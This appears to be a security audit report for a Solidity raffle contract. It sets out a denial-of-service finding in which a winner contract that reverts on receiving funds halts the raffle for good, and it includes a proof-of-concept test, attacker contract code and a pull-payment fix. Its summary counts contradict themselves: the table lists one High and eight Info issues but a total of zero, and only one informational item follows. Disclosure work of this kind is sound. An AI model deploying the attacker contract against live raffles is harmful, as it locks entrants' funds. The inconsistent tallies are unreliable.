# Lottery Audit Report

# Audit Details

GitHub：https://github.com/williamhjc/foundry-lottery

**The findings described in this document correspond the following commit hash:**

```
171d53cb768ea9280add910eee715d3b205066a9
```

## Scope

```
./src/
-- Raffle.sol
```

# Protocol Summary

A fully decentralized raffle system powered by Chainlink VRF v2.5 for verifiable randomness and Chainlink Automation for periodic draws。

## Roles

- Raffle Entrant: Anyone who enters the raffle. Denominated by being in the `players` array.

# Executive Summary

## Issues found

| Severity | Number of issues found |
| -------- | ---------------------- |
| High     | 1                      |
| Medium   | 0                      |
| Low      | 0                      |
| Info     | 8                      |
| Total    | 0                      |

# Findings

#### High

### [H-4] Malicious winner can forever halt the raffle

**Description:** Once the winner is chosen, the `fulfillRandomWords` function sends the prize to the the corresponding address with an external call to the winner account.

```solidity
 (bool success,) = recentWinner.call{value: address(this).balance}("");
        if (!success) {
            revert Raffle__TransferFailed();
        }
```



If the `winner` account were a smart contract that did not implement a payable `fallback` or `receive` function, or these functions were included but reverted, the external call above would fail, and execution of the `fulfillRandomWords` function would revert, the state of raffle always `caculating` and execution of the performUpkeep function would halt.  Therefore, the prize would never be distributed and the raffle would never be able to start a new round.

**Impact:** In either case, because it'd be impossible to distribute the prize and start a new round, the raffle would be halted forever.

**Proof of Concept:**

Place the following test into `RaffleTest.t.sol`.

```solidity
function testEvilWinnerBlocksRaffle() public raffleEntered skipFork {
        for (uint256 i = 0; i < 4; i++) {
            address player = address(new AttackerContract());
            hoax(player, 1 ether); // deal 1 eth to the player
            raffle.enterRaffle{value: raffleEntranceFee}();
        }

        vm.recordLogs();
        raffle.performUpkeep(""); // emits requestId
        Vm.Log[] memory entries = vm.getRecordedLogs();
        console2.logBytes32(entries[1].topics[1]);
        bytes32 requestId = entries[1].topics[1]; // get the requestId from the logs

        VRFCoordinatorV2_5Mock(vrfCoordinatorV2_5).fulfillRandomWords(uint256(requestId), address(raffle));
        Raffle.RaffleState raffleState = raffle.getRaffleState();

        // call performUpkeep again
        vm.expectRevert(abi.encodeWithSelector(Raffle.Raffle__UpkeepNotNeeded.selector, address(raffle).balance, 5, 1));
        raffle.performUpkeep("");

        assert(uint256(raffleState) == 1);
    }
```

For example, the `AttackerContract` can be this:

```solidity
contract AttackerContract {
    // Implements a `receive` function that always reverts
    receive() external payable {
        revert();
    }
}
```

**Recommended Mitigation:** Favor pull-payments over push-payments. This means modifying the `fulfillRandomWords` function so that the winner account has to claim the prize by calling a function, instead of having the contract automatically send the funds during execution of `fulfillRandomWords`.

#### Informational / Non-Critical

### [I-1] Floating pragmas

**Description:** Contracts should use strict versions of solidity. Locking the version ensures that contracts are not deployed with a different version of solidity than they were tested with. An incorrect version could lead to uninteded results.

https://swcregistry.io/docs/SWC-103/

**Recommended Mitigation:** Lock up pragma versions.

```solidity
-^0.8.0 (lib/chainlink-brownie-contracts/contracts/src/v0.8/interfaces/AutomationCompatibleInterface.sol#2)
                -^0.8.0 (lib/chainlink-brownie-contracts/contracts/src/v0.8/shared/access/ConfirmedOwner.sol#2)
                -^0.8.0 (lib/chainlink-brownie-contracts/contracts/src/v0.8/shared/access/ConfirmedOwnerWithProposal.sol#2)
                -^0.8.0 (lib/chainlink-brownie-contracts/contracts/src/v0.8/shared/interfaces/IOwnable.sol#2)
                -^0.8.0 (lib/chainlink-brownie-contracts/contracts/src/v0.8/vrf/dev/interfaces/IVRFCoordinatorV2Plus.sol#2)
                -^0.8.0 (lib/chainlink-brownie-contracts/contracts/src/v0.8/vrf/dev/interfaces/IVRFMigratableConsumerV2Plus.sol#2)
                -^0.8.0 (lib/chainlink-brownie-contracts/contracts/src/v0.8/vrf/dev/interfaces/IVRFSubscriptionV2Plus.sol#2)
        - Version constraint ^0.8.4 is used by:
                -^0.8.4 (lib/chainlink-brownie-contracts/contracts/src/v0.8/vrf/dev/VRFConsumerBaseV2Plus.sol#2)
                -^0.8.4 (lib/chainlink-brownie-contracts/contracts/src/v0.8/vrf/dev/libraries/VRFV2PlusClient.sol#2)
        - Version constraint 0.8.19 is used by:
                -0.8.19 (src/Raffle.sol#2)
```

